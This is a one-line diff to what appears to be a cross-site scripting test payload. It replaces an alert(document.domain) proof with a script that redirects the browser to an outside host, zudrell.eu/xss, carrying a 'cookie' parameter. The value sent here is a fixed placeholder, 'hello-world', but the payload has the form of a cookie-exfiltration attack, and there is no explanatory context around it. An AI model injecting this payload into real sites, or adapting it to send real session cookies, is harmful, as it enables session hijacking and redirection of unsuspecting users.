@@ -1,1 +1,1 @@
-alert(document.domain)
+window.location="https://zudrell.eu/xss?&cookie=hello-world"
